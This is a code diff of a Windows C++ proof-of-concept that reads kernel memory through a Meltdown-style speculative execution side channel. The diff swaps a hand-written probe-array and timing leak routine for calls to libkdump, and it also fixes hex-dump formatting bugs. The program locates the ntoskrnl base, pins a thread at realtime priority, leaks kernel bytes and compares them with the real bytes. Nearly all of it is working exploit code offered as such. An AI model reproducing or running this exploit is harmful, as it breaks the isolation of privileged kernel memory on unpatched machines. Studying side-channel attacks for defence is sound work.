@@ -1,55 +1,6 @@
 #include "stdafx.h"
 
-extern "C" {
-	void* probeArray;
-	void* timings;
-	void* pointers;
-	void* controls;
-	extern char _stopspeculate[];
-	extern void _leak_branch();
-	extern void _leak_exception(void* target);
-}
-
-LONG WINAPI exception_filter(EXCEPTION_POINTERS* ep) noexcept {
-	ep->ContextRecord->Rip = reinterpret_cast<DWORD64>(_stopspeculate);
-	return EXCEPTION_CONTINUE_EXECUTION;
-}
-
-void leak_branch(void*) noexcept {
-	_leak_branch();
-}
-
-void leak_exception(void* target) noexcept {
-	__try {
-		_leak_exception(target);
-	} __except(exception_filter(static_cast<EXCEPTION_POINTERS*>(_exception_info()))) {
-		;
-	}
-}
-
-std::byte leak(void* target) {
-	auto probe_array = std::make_unique<std::byte[]>(0x1000 * 0x100);
-	auto timing_array = std::make_unique<std::uint64_t[]>(0x100);
-	auto pointers_array = std::make_unique<void*[]>(0x100);
-	auto controls_array = std::make_unique<std::uint64_t[]>(0x100);
-
-	for(std::size_t i = 0; i < 0x100; ++i) {
-		pointers_array[i] = &pointers_array[0];
-		controls_array[i] = 0ui64;
-	}
-	pointers_array[0xff] = target;
-	controls_array[0xff] = 1ui64;
-
-	probeArray = probe_array.get();
-	timings = timing_array.get();
-	pointers = pointers_array.get();
-	controls = controls_array.get();
-
-	leak_branch(target);
-
-	auto it = std::min_element(timing_array.get(), timing_array.get() + 0x100);
-	return std::byte{ static_cast<std::uint8_t>(std::distance(it, timing_array.get())) };
-}
+#include "libkdump.h"
 
 void hex_dump(gsl::span<std::byte> data, std::ostream& os, std::ptrdiff_t width) {
 	const auto start = data.begin();
@@ -62,7 +13,7 @@ void hex_dump(gsl::span<std::byte> data, std::ostream& os, std::ptrdiff_t width)
 		const std::ptrdiff_t line_length = std::min(width, end - line);
 		for(auto next = line; next != end && next != line + width; ++next) {
 			const char ch = static_cast<char>(*next);
-			os << (ch < 32) ? '.' : ch;
+			os << (ch < 32 ? '.' : ch);
 		}
 		if(line_length != width) {
 			os << std::string(gsl::narrow_cast<std::size_t>(width - line_length), ' ');
@@ -72,7 +23,7 @@ void hex_dump(gsl::span<std::byte> data, std::ostream& os, std::ptrdiff_t width)
 			os << " ";
 			os.width(2);
 			os.fill('0');
-			os << std::hex << std::uppercase << static_cast<int>(ch);
+			os << std::hex << std::uppercase << static_cast<unsigned int>(static_cast<unsigned char>(ch));
 		}
 		os << std::endl;
 		line = line + line_length;
@@ -103,6 +54,13 @@ struct SYSTEM_MODULE_INFORMATION
 #pragma warning(pop)
 
 int main() {
+	HANDLE output = GetStdHandle(STD_OUTPUT_HANDLE);
+	DWORD mode = 0;
+	::GetConsoleMode(output, &mode);
+	mode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
+	::SetConsoleMode(output, mode);
+
+	// 0xfffff802'd6d62320  
 	decltype(NtQuerySystemInformation)* ntQuerySystemInformation = reinterpret_cast<decltype(NtQuerySystemInformation)*>(
 	                                                               reinterpret_cast<void*>(::GetProcAddress(::GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
 	std::unique_ptr<std::byte[]> module_info;
@@ -119,18 +77,34 @@ int main() {
 	HMODULE ntoskrnl(::LoadLibraryW(L"ntoskrnl.exe"));
 	auto f = gsl::finally([=]() { ::FreeLibrary(ntoskrnl); });
 
+	//void* const target = reinterpret_cast<void*>(0xfffff802'd6d62320);
 	void* const target = kernel_base;
-	const std::uint64_t bytes_to_leak = 64;
+	const std::uint64_t bytes_to_leak = 16;
+
+	//MEMORY_BASIC_INFORMATION mbi = { 0 };
+	//::VirtualQuery(kernel_base, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
 
 	std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
 	std::cout << "leaking " << target << std::endl;
+
+	::SetPriorityClass(::GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
+	::SetThreadAffinityMask(::GetCurrentThread(), 0x1);
+	::SetThreadPriority(::GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
+
+	libkdump_enable_debug(1);
+	libkdump_config_t config = libkdump_get_autoconfig();
+	libkdump_init(config);
+
 	for(DWORD i = 0; i < bytes_to_leak; i++) {
-		buffer[i] = leak(static_cast<std::byte*>(target) + i);
+		buffer[i] = libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(target) + i));
 	}
 	std::cout << "Leaked:" << std::endl;
 	hex_dump(gsl::make_span(buffer.get(), bytes_to_leak), std::cout, 16);
+	std::cout << std::endl;
 	std::cout << "Actual:" << std::endl;
 	hex_dump(gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl), bytes_to_leak), std::cout, 16);
 
+
+	libkdump_cleanup();
 	return 0;
 }
